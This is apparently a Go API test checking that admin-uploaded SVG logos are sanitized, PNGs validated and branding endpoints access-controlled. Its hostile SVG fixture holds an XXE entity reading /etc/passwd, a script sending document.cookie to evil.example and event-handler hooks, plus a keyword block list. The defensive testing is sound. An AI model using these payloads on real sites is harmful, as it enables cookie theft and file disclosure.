package api

import (
	"bytes"
	"encoding/json"
	"image"
	"image/color"
	"image/png"
	"net/http"
	"strings"
	"testing"

	"samuori.invalid/samuori/internal/api/apigen"
	"samuori.invalid/samuori/internal/auth"
)

const hostileSVG = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="100" viewBox="0 0 300 100" onload="steal()">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <rect width="300" height="100" fill="#123456" onclick="pwn()"/>
  <image href="https://evil.example/track.png"/>
</svg>`

func tinyPNG(t *testing.T) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 40, 12))
	img.Set(0, 0, color.RGBA{1, 2, 3, 255})
	var b bytes.Buffer
	if err := png.Encode(&b, img); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// TestOperatorLogoBranding (SEC-BRAND-01) covers ADR 0072: only administrators set the logo, uploaded SVG is
// sanitized before it is served, the serving endpoint is unauthenticated and logo-only, and clearing reverts to the
// Samuori mark.
func TestOperatorLogoBranding(t *testing.T) {
	l := newLive(t, false)
	l.setup(t)
	admin := l.adminMember(t)

	// No custom logo yet.
	st, _, out := l.raw(t, admin, "GET", "/branding", "", nil, nil)
	status := decode[apigen.BrandingStatus](t, requireOK(t, st, out))
	if status.CustomLogo {
		t.Fatal("customLogo true before any upload")
	}

	// The public endpoint 404s so the UI falls back to the Samuori mark.
	anon := l.client()
	if r := l.call(t, anon, "GET", "/branding/logo", "", nil); r.StatusCode != http.StatusNotFound {
		t.Fatalf("public logo before upload = %d, want 404", r.StatusCode)
	}

	// A developer cannot set the logo.
	dev := l.makeDeveloper(t, admin)
	if code, _, _ := l.raw(t, dev, "POST", "/branding/logo", "image/svg+xml", []byte(hostileSVG), nil); code != http.StatusForbidden {
		t.Fatalf("developer upload = %d, want 403", code)
	}

	// Admin uploads a hostile SVG; it is accepted but sanitized.
	code, _, out := l.raw(t, admin, "POST", "/branding/logo", "image/svg+xml", []byte(hostileSVG), nil)
	status = decode[apigen.BrandingStatus](t, requireOK(t, code, out))
	if !status.CustomLogo || status.Logo == nil {
		t.Fatalf("after upload customLogo=%v logo=%v", status.CustomLogo, status.Logo)
	}

	// The served bytes carry none of the active content, and the response is logo-only.
	r := l.call(t, anon, "GET", "/branding/logo", "", nil)
	if r.StatusCode != http.StatusOK {
		t.Fatalf("public logo = %d", r.StatusCode)
	}
	if ct := r.Header.Get("Content-Type"); ct != "image/svg+xml" {
		t.Fatalf("content-type = %q", ct)
	}
	if r.Header.Get("Content-Security-Policy") == "" {
		t.Error("no Content-Security-Policy on the served logo")
	}
	served := readBody(t, r)
	low := strings.ToLower(string(served))
	for _, bad := range []string{"<script", "onload", "onclick", "evil.example", "etc/passwd", "<!doctype", "<image"} {
		if strings.Contains(low, bad) {
			t.Errorf("served logo still contains %q:\n%s", bad, served)
		}
	}
	if !strings.Contains(low, "<rect") {
		t.Errorf("safe geometry lost:\n%s", served)
	}

	// PNG is accepted; a file that is not the declared format is refused.
	if code, _, out := l.raw(t, admin, "POST", "/branding/logo", "image/png", tinyPNG(t), nil); code != http.StatusOK {
		t.Fatalf("png upload = %d %s", code, out)
	}
	if code, _, _ := l.raw(t, admin, "POST", "/branding/logo", "image/png", []byte("not a png"), nil); code != http.StatusUnprocessableEntity {
		t.Fatalf("bogus png = %d, want 422", code)
	}

	// GET /branding needs authentication.
	if r := l.call(t, anon, "GET", "/branding", "", nil); r.StatusCode != http.StatusUnauthorized {
		t.Fatalf("anonymous GET /branding = %d, want 401", r.StatusCode)
	}

	// Clearing reverts to the Samuori mark.
	if code, _, out := l.raw(t, admin, "DELETE", "/branding", "", nil, nil); code != http.StatusNoContent {
		t.Fatalf("clear = %d %s", code, out)
	}
	if r := l.call(t, anon, "GET", "/branding/logo", "", nil); r.StatusCode != http.StatusNotFound {
		t.Fatalf("public logo after clear = %d, want 404", r.StatusCode)
	}
}

func (l *live) makeDeveloper(t *testing.T, admin member) member {
	t.Helper()
	h := map[string]string{auth.CSRFHeader: admin.csrf[auth.CSRFHeader]}
	var tm apigen.Team
	_ = json.NewDecoder(l.call(t, admin.c, "POST", "/teams", `{"name":"devs"}`, h).Body).Decode(&tm)
	var u apigen.User
	_ = json.NewDecoder(l.call(t, admin.c, "POST", "/users", `{"username":"dev","password":"a long secret phrase"}`, h).Body).Decode(&u)
	if r := l.call(t, admin.c, "POST", "/role-bindings", `{"principalId":"`+u.Id+`","role":"developer","scopeType":"team","scopeId":"`+tm.Id+`"}`, h); r.StatusCode != 201 {
		t.Fatalf("bind developer = %d", r.StatusCode)
	}
	c := l.client()
	resp := l.call(t, c, "POST", "/auth/login", `{"username":"dev","password":"a long secret phrase"}`, nil)
	for _, ck := range resp.Cookies() {
		if ck.Name == auth.CSRFCookie {
			return member{c, map[string]string{auth.CSRFHeader: ck.Value}}
		}
	}
	t.Fatal("developer login failed")
	return member{}
}

func requireOK(t *testing.T, code int, out []byte) []byte {
	t.Helper()
	if code != http.StatusOK {
		t.Fatalf("status = %d %s, want 200", code, out)
	}
	return out
}

func readBody(t *testing.T, r *http.Response) []byte {
	t.Helper()
	var b bytes.Buffer
	if _, err := b.ReadFrom(r.Body); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}
